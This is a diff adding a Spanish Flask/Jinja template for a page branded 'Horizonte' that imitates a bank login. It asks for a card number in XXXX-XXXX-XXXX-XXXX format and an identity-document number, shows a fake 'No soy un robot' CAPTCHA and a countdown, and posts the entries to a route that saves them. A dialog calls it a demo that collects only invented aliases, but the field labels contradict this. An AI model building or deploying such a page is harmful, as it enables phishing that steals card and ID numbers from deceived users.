@@ -1,0 +1,67 @@
+{% extends "base.html" %}
+{% block scripts %}<script src="{{ url_for('static', filename='js/demo.js') }}" defer></script>{% endblock %}
+{% block content %}
+  <main class="page">
+    <div class="page-note">
+      <span>esta ventana se actualizara en <strong id="countdown" role="timer" aria-live="off">30</strong> segundos</span>      <svg class="timer-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="12" cy="14" r="8" stroke="currentColor" stroke-width="1.8"/><path d="M9 2h6m-3 0v4m6 1 2-2m-8 5v5l3 2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+
+      <button type="button" class="text-button" id="restart-timer" hidden>Reiniciar</button>
+      <span class="sr-only" id="timer-status" role="status"></span>
+    </div>
+    <div class="layout">
+      <section class="welcome" aria-label="Presentación de Horizonte">
+        <!-- Logo principal: archivo configurable en app.py, LOGO_PRINCIPAL. -->
+        <a class="brand" href="{{ url_for('index') }}"><img class="brand-logo" src="{{ logo_principal_src }}" alt="Horizonte, inicio" width="260" height="66"></a>
+        <div class="welcome-heading"><h1>¡Hola!<br><span>Cambia frecuentemente tus claves y contraseñas de acceso</span></h1></div>
+        <div class="carousel" aria-roledescription="carrusel" aria-label="Consejos para explorar la demo">
+          <div class="slide" id="slide-1" role="group" aria-label="1 de 3">
+            <a class="brand" href="{{ url_for('index') }}"><img src="{{ url_for('static', filename='img/carrusel4.svg') }}"
+     alt="Imagen de demostración"></a>
+            <div><h2>Cambia frecuentemente tus claves y contraseñas de acceso.</h2></div>
+          </div>
+          <div class="slide" id="slide-2" role="group" aria-label="2 de 3" hidden>
+            <span class="tip-icon" aria-hidden="true"><svg viewBox="0 0 48 48" fill="none"><rect x="12" y="5" width="24" height="38" rx="5" stroke="currentColor" stroke-width="2.5"/><path d="M20 10h8M22 37h4m-9-14 5 5 9-10" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
+            <div><h2>Un diseño que te acompaña.</h2><p>Desde una pantalla grande o desde tu móvil,<br>cada elemento encuentra su lugar.</p></div>
+          </div>
+          <div class="slide" id="slide-3" role="group" aria-label="3 de 3" hidden>
+            <span class="tip-icon" aria-hidden="true"><svg viewBox="0 0 48 48" fill="none"><circle cx="24" cy="24" r="18" stroke="currentColor" stroke-width="2.5"/><path d="m30 17-4 12-9 3 4-12 9-3Z" stroke="currentColor" stroke-width="2.5" stroke-linejoin="round"/></svg></span>
+            <div><h2>Todo empieza por descubrir.</h2><p>Prueba los controles y conoce la propuesta.<br>Inventa un alias y una referencia de ejemplo.</p></div>
+          </div>
+        </div>
+        <div class="carousel-controls" aria-label="Elegir consejo">
+          <button type="button" class="dot" aria-label="Mostrar consejo 1" aria-controls="slide-1" aria-pressed="true" data-slide="0"></button>
+          <button type="button" class="dot" aria-label="Mostrar consejo 2" aria-controls="slide-2" aria-pressed="false" data-slide="1"></button>
+          <button type="button" class="dot" aria-label="Mostrar consejo 3" aria-controls="slide-3" aria-pressed="false" data-slide="2"></button>
+        </div>
+      </section>
+      <section class="access" aria-labelledby="access-title">
+      
+        <h2 id="access-title">Número de Tarjeta</h2>
+        <form class="demo-form" action="{{ url_for('guardar') }}" method="post">
+        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+        {% if error %}<p class="form-error" role="alert">{{ error }}</p>{% endif %}
+        <div class="profile-field"><input id="demo-profile" name="visitante" type="text" value="{{ values.get('visitante', '') }}" placeholder="XXXX - XXXX -XXXX - XXXX" maxlength="32" required autocomplete="off" aria-describedby="profile-help"><span class="read-only"><img style="position:relative;top: 2px;" src="{{ url_for('static', filename='img/eye.svg') }}" alt="Imagen de "></a></span></div>
+        <div class="detail-row"><span></div>
+       <label class="field-label reference-label" for="demo-reference"> <img style="width: 19px;position:relative;top: 1px;" src="{{ url_for('static', filename='img/document.svg') }}" alt="Imagen de ">       Frecuentes</label>
+        <div class="profile-field"> <a class="brand" href="{{ url_for('index') }}"><img style="position:relative;top: 18px;" src="{{ url_for('static', filename='img/document.svg') }}" alt="Imagen de "></a><input id="demo-reference" name="referencia" type="text" value="{{ values.get('referencia', '') }}" placeholder="Nro. Documento" maxlength="40" required autocomplete="off" spellcheck="false" aria-describedby="reference-help"></div>
+        <p class="field-help" id="reference-help"></p>
+        <div class="verification-demo" style="background: #ffffff;">
+          <label class="verification-control" for="demo-check">
+            <input type="checkbox" id="demo-check" aria-describedby="verification-help">
+            <span class="verification-box" aria-hidden="true"><span class="verification-spinner"></span><svg class="verification-tick" viewBox="0 0 32 32" fill="none"><path d="m6 16 7 7L26 9" pathLength="1" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg></span>
+            <span>No soy un robot</span>
+          </label>
+           <a class="brand" href="{{ url_for('index') }}"><img src="{{ url_for('static', filename='img/cap.png') }}"
+     alt="Imagen de demostración"></a>
+        </div>
+        <p class="verification-help" id="verification-help"></p>
+        <button class="primary-button" id="explore-button" type="submit">Continuar</span></button>
+        </form>
+      </section>
+    </div>
+    <footer><span><strong></strong></span><button type="button" class="text-button" id="about-button"><span aria-hidden="true">↗</span></button><span></span></footer>
+  </main>
+  <dialog id="demo-dialog" aria-labelledby="dialog-title" aria-describedby="dialog-description">
+    <div class="dialog-content"><span class="pill">ESTÁS EN LA DEMO</span><h2 id="dialog-title">¡Todo listo para explorar!</h2><p id="dialog-description">Horizonte es una marca ficticia. El formulario envía únicamente un alias de visitante y una referencia inventados al servidor local de Python para guardarlos en un TXT. La casilla es solo una animación y el contador no borra el formulario.</p><form method="dialog"><button class="primary-button" autofocus>Volver a la maqueta</button></form></div>
+  </dialog>
+{% endblock %}
